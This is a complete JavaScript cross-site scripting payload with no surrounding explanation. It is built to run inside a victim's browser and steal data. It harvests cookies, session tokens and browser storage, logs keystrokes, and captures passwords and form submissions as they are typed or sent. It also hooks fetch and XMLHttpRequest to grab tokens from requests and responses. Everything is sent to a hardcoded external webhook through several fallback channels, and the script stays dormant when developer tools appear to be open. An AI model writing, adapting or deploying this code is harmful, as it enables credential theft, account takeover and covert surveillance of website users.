(function() {
    'use strict';
    
    // Enhanced stealth detection
    if (window.XSS_ACTIVE || window._phantom || window.callPhantom) return;
    window.XSS_ACTIVE = true;
    
    // Configuration
    const CONFIG = {
        webhook: 'https://webhook.link/3700213d-a481-4b99-9407-032bc8ee1126',
        beaconInterval: 25000,
        stealthMode: true,
        autoStart: true
    };

    class XSSController {
        constructor() {
            this.collectedData = {
                victim: {},
                tokens: {},
                forms: [],
                keystrokes: [],
                passwords: []
            };
            this.isAdmin = false;
            this.keystrokeBuffer = [];
            
            if (CONFIG.autoStart) {
                this.init();
            }
        }
        
        init() {
            console.log('[XSS] Controller activated on:', window.location.hostname);
            this.executePhase1();
            setTimeout(() => this.executePhase2(), 800);
            setTimeout(() => this.executePhase3(), 2000);
        }
        
        executePhase1() {
            // Comprehensive reconnaissance
            this.collectedData.victim = {
                target: {
                    url: window.location.href,
                    hostname: window.location.hostname,
                    origin: window.location.origin,
                    path: window.location.pathname,
                    query: window.location.search,
                    hash: window.location.hash
                },
                environment: {
                    userAgent: navigator.userAgent,
                    language: navigator.language,
                    languages: navigator.languages,
                    platform: navigator.platform,
                    cookieEnabled: navigator.cookieEnabled,
                    javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
                    pdfViewerEnabled: navigator.pdfViewerEnabled || false
                },
                screen: {
                    width: screen.width,
                    height: screen.height,
                    colorDepth: screen.colorDepth,
                    pixelDepth: screen.pixelDepth
                },
                viewport: {
                    width: window.innerWidth,
                    height: window.innerHeight
                },
                timing: {
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    timestamp: new Date().toISOString(),
                    timezoneOffset: new Date().getTimezoneOffset()
                }
            };
            
            this.extractStorageData();
            this.extractCookies();
            this.detectAdminAreas();
            
            this.log('Reconnaissance completed');
            this.exfiltrate({
                phase: 'recon',
                data: this.collectedData,
                type: 'initial_scan'
            });
        }
        
        executePhase2() {
            // Active collection
            this.hijackAllForms();
            this.enableKeylogging();
            this.interceptFetch();
            this.monitorInputs();
            this.extractHiddenData();
            
            this.log('Active collection enabled');
        }
        
        executePhase3() {
            // Persistence & advanced
            this.installBackdoor();
            this.startBeacon();
            this.attemptCSRF();
            this.sniffEndpoints();
            
            this.log('Persistence established');
        }
        
        extractStorageData() {
            // LocalStorage
            try {
                this.collectedData.victim.localStorage = {};
                for (let i = 0; i < localStorage.length; i++) {
                    const key = localStorage.key(i);
                    this.collectedData.victim.localStorage[key] = localStorage.getItem(key);
                }
            } catch (e) {}
            
            // SessionStorage
            try {
                this.collectedData.victim.sessionStorage = {};
                for (let i = 0; i < sessionStorage.length; i++) {
                    const key = sessionStorage.key(i);
                    this.collectedData.victim.sessionStorage[key] = sessionStorage.getItem(key);
                }
            } catch (e) {}
        }
        
        extractCookies() {
            this.collectedData.tokens.cookies = document.cookie;
            
            // Parse cookies into object
            const cookieObj = {};
            document.cookie.split(';').forEach(cookie => {
                const [name, value] = cookie.trim().split('=');
                if (name && value) {
                    cookieObj[name] = value;
                    
                    // Identify session tokens
                    if (this.isSessionToken(name)) {
                        this.collectedData.tokens[name] = value;
                        this.log(`Session token captured: ${name}`);
                    }
                }
            });
            this.collectedData.tokens.parsedCookies = cookieObj;
        }
        
        detectAdminAreas() {
            // URL-based detection
            const adminPatterns = [
                '/admin', '/dashboard', '/manage', '/cp', '/control', '/backend',
                '/administrator', '/manager', '/system', '/config'
            ];
            
            this.isAdmin = adminPatterns.some(pattern => 
                window.location.pathname.toLowerCase().includes(pattern)
            );
            
            this.collectedData.victim.isAdminArea = this.isAdmin;
        }
        
        hijackAllForms() {
            // Hijack existing forms
            const forms = document.querySelectorAll('form');
            forms.forEach(form => this.instrumentForm(form));
            
            // Monitor for dynamically added forms
            const observer = new MutationObserver(mutations => {
                mutations.forEach(mutation => {
                    mutation.addedNodes.forEach(node => {
                        if (node.tagName === 'FORM') {
                            this.instrumentForm(node);
                        } else if (node.querySelectorAll) {
                            node.querySelectorAll('form').forEach(form => this.instrumentForm(form));
                        }
                    });
                });
            });
            
            observer.observe(document.body, {
                childList: true,
                subtree: true
            });
            
            // Global submit listener
            document.addEventListener('submit', (e) => {
                this.captureFormSubmission(e.target);
            }, true);
        }
        
        instrumentForm(form) {
            try {
                const originalSubmit = form.onsubmit;
                
                form.onsubmit = (e) => {
                    this.captureFormSubmission(form);
                    if (originalSubmit) {
                        return originalSubmit.call(form, e);
                    }
                    return true;
                };
            } catch (e) {}
        }
        
        captureFormSubmission(form) {
            try {
                const formData = new FormData(form);
                const captured = {
                    action: form.action,
                    method: form.method,
                    inputs: [],
                    timestamp: new Date().toISOString()
                };
                
                for (let [name, value] of formData.entries()) {
                    captured.inputs.push({
                        name: name,
                        value: value,
                        type: this.getInputType(form, name)
                    });
                    
                    // Immediate exfiltration for passwords
                    if (name.toLowerCase().includes('password') && value) {
                        this.exfiltrate({
                            type: 'password_capture',
                            password: value,
                            field: name,
                            form: form.action,
                            page: window.location.href,
                            timestamp: new Date().toISOString()
                        });
                    }
                }
                
                this.collectedData.forms.push(captured);
                this.log(`Form captured: ${form.action}`);
                
                // Exfiltrate form data immediately
                this.exfiltrate({
                    type: 'form_submission',
                    form: captured,
                    page: window.location.href
                });
                
            } catch (e) {}
        }
        
        getInputType(form, fieldName) {
            const input = form.querySelector(`[name="${fieldName}"]`);
            return input ? input.type : 'unknown';
        }
        
        enableKeylogging() {
            let buffer = '';
            let lastKeyTime = Date.now();
            
            document.addEventListener('keydown', (e) => {
                const now = Date.now();
                
                // Reset buffer if too much time passed
                if (now - lastKeyTime > 2000) {
                    if (buffer.length > 0) {
                        this.keystrokeBuffer.push(buffer);
                        buffer = '';
                    }
                }
                
                lastKeyTime = now;
                
                // Handle special keys
                if (e.key === 'Enter') {
                    buffer += '[ENTER]';
                    this.keystrokeBuffer.push(buffer);
                    buffer = '';
                } else if (e.key === 'Tab') {
                    buffer += '[TAB]';
                } else if (e.key === 'Backspace') {
                    buffer = buffer.slice(0, -1);
                } else if (e.key.length === 1) {
                    buffer += e.key;
                }
                
                // Store and clear buffer periodically
                if (buffer.length > 40) {
                    this.keystrokeBuffer.push(buffer);
                    buffer = '';
                }
                
                // Exfiltrate if we have significant data
                if (this.keystrokeBuffer.length >= 3) {
                    this.exfiltrate({
                        type: 'keystrokes',
                        keystrokes: [...this.keystrokeBuffer],
                        page: window.location.href,
                        timestamp: new Date().toISOString()
                    });
                    this.keystrokeBuffer = [];
                }
            });
        }
        
        monitorInputs() {
            // Monitor password fields specifically
            const passwordFields = document.querySelectorAll('input[type="password"]');
            passwordFields.forEach(field => {
                field.addEventListener('input', (e) => {
                    if (e.target.value) {
                        this.exfiltrate({
                            type: 'password_input',
                            value: e.target.value,
                            name: e.target.name || 'unknown',
                            page: window.location.href,
                            timestamp: new Date().toISOString()
                        });
                    }
                });
            });
        }
        
        interceptFetch() {
            const originalFetch = window.fetch;
            window.fetch = (...args) => {
                const [resource, config] = args;
                
                // Log the request
                this.log(`Fetch: ${resource}`);
                
                // Capture sensitive data in requests
                if (config && config.body) {
                    try {
                        const bodyStr = typeof config.body === 'string' ? config.body : JSON.stringify(config.body);
                        if (bodyStr.includes('password') || bodyStr.includes('token')) {
                            this.exfiltrate({
                                type: 'fetch_sensitive',
                                url: resource,
                                body: bodyStr.substring(0, 1000), // Limit size
                                timestamp: new Date().toISOString()
                            });
                        }
                    } catch (e) {}
                }
                
                return originalFetch.apply(window, args);
            };
        }
        
        extractHiddenData() {
            // Extract hidden form fields
            const hiddenInputs = document.querySelectorAll('input[type="hidden"]');
            const hiddenData = [];
            
            hiddenInputs.forEach(input => {
                if (input.name && input.value) {
                    hiddenData.push({
                        name: input.name,
                        value: input.value
                    });
                }
            });
            
            if (hiddenData.length > 0) {
                this.collectedData.hiddenFields = hiddenData;
            }
        }
        
        installBackdoor() {
            // Override XMLHttpRequest
            this.interceptXHR();
        }
        
        interceptXHR() {
            const OriginalXHR = window.XMLHttpRequest;
            const self = this;
            
            window.XMLHttpRequest = function() {
                const xhr = new OriginalXHR();
                const open = xhr.open;
                
                xhr.open = function(method, url) {
                    this._method = method;
                    this._url = url;
                    return open.apply(this, arguments);
                };
                
                xhr.addEventListener('load', function() {
                    if (this.responseText && this._url) {
                        // Capture API responses that might contain tokens
                        const response = this.responseText.substring(0, 500);
                        if (response.includes('token') || response.includes('session')) {
                            self.exfiltrate({
                                type: 'xhr_response',
                                url: this._url,
                                method: this._method,
                                status: this.status,
                                response: response,
                                timestamp: new Date().toISOString()
                            });
                        }
                    }
                });
                
                return xhr;
            };
        }
        
        attemptCSRF() {
            // Only attempt in admin areas
            if (!this.isAdmin) return;
            
            this.log('Attempting CSRF in admin area');
        }
        
        sniffEndpoints() {
            // Look for API endpoints in the page
            const endpoints = new Set();
            
            // Check scripts for endpoints
            const scripts = document.querySelectorAll('script[src]');
            scripts.forEach(script => {
                const src = script.getAttribute('src');
                if (src.includes('/api/') || src.includes('/v1/')) {
                    endpoints.add(src);
                }
            });
            
            if (endpoints.size > 0) {
                this.collectedData.endpoints = Array.from(endpoints);
            }
        }
        
        startBeacon() {
            // Regular beacon for data exfiltration
            setInterval(() => {
                const hasData = this.collectedData.forms.length > 0 || 
                               this.keystrokeBuffer.length > 0;
                
                if (hasData) {
                    this.exfiltrate({
                        type: 'beacon',
                        data: {
                            forms: this.collectedData.forms,
                            keystrokes: this.keystrokeBuffer,
                            tokens: this.collectedData.tokens,
                            timestamp: new Date().toISOString(),
                            page: window.location.href
                        }
                    });
                    
                    // Clear sent data
                    this.collectedData.forms = [];
                    this.keystrokeBuffer = [];
                }
            }, CONFIG.beaconInterval);
        }
        
        exfiltrate(data) {
            // Enhanced data with metadata
            const enhancedData = {
                ...data,
                metadata: {
                    origin: window.location.origin,
                    userAgent: navigator.userAgent,
                    timestamp: new Date().toISOString(),
                    sessionId: this.generateSessionId()
                }
            };
            
            const exfilMethods = [
                // Method 1: fetch with proper headers (matches curl format)
                () => {
                    return fetch(CONFIG.webhook, {
                        method: 'POST',
                        mode: 'no-cors',
                        headers: {
                            'Content-Type': 'application/json',
                            'X-MyHeader': '123',
                            'X-Payload-Type': data.type || 'unknown',
                            'X-Origin': window.location.origin,
                            'User-Agent': navigator.userAgent
                        },
                        body: JSON.stringify(enhancedData)
                    });
                },
                
                // Method 2: sendBeacon with blob
                () => {
                    const headers = {
                        'Content-Type': 'application/json',
                        'X-MyHeader': '123',
                        'X-Payload-Type': data.type || 'unknown'
                    };
                    
                    const blob = new Blob([JSON.stringify(enhancedData)], {type: 'application/json'});
                    return navigator.sendBeacon(CONFIG.webhook, blob);
                },
                
                // Method 3: XMLHttpRequest with headers
                () => {
                    return new Promise((resolve) => {
                        const xhr = new XMLHttpRequest();
                        xhr.open('POST', CONFIG.webhook, true);
                        xhr.setRequestHeader('Content-Type', 'application/json');
                        xhr.setRequestHeader('X-MyHeader', '123');
                        xhr.setRequestHeader('X-Payload-Type', data.type || 'unknown');
                        xhr.setRequestHeader('X-Origin', window.location.origin);
                        
                        xhr.onreadystatechange = function() {
                            if (xhr.readyState === 4) {
                                resolve(true);
                            }
                        };
                        
                        xhr.send(JSON.stringify(enhancedData));
                    });
                },
                
                // Method 4: Image beacon as fallback (limited data)
                () => {
                    const img = new Image();
                    const encoded = btoa(JSON.stringify(enhancedData)).substring(0, 2000); // Limit length
                    img.src = `${CONFIG.webhook}?data=${encoded}&t=${Date.now()}&r=${Math.random()}`;
                    return true;
                }
            ];
            
            // Try methods until one works
            for (const method of exfilMethods) {
                try {
                    const result = method();
                    if (result) {
                        this.log(`Data exfiltrated: ${data.type || 'unknown'}`);
                        break;
                    }
                } catch (e) {
                    continue;
                }
            }
        }
        
        generateSessionId() {
            // Generate a session ID for tracking
            if (!this.sessionId) {
                this.sessionId = Math.random().toString(36).substring(2, 15) + 
                                Math.random().toString(36).substring(2, 15);
            }
            return this.sessionId;
        }
        
        isSessionToken(name) {
            const tokenNames = [
                'session', 'token', 'auth', 'jwt', 'access', 'refresh', 
                'csrf', 'xsrf', 'bearer', 'oauth', 'sess'
            ];
            return tokenNames.some(token => name.toLowerCase().includes(token));
        }
        
        log(message) {
            console.log(`%c[XSS] ${message}`, 'color: #ff6b6b; font-weight: bold;');
        }
    }
    
    // Stealth initialization
    const init = () => {
        // Wait for DOM to be ready
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', () => {
                setTimeout(() => new XSSController(), 300);
            });
        } else {
            setTimeout(() => new XSSController(), 300);
        }
    };
    
    // Anti-debugging and stealth
    const detectDevTools = () => {
        const threshold = 160;
        const widthThreshold = window.outerWidth - window.innerWidth > threshold;
        const heightThreshold = window.outerHeight - window.innerHeight > threshold;
        
        if (widthThreshold || heightThreshold) {
            return true;
        }
        return false;
    };
    
    // Only initialize if not in dev tools
    if (!detectDevTools()) {
        init();
    }
    
})();
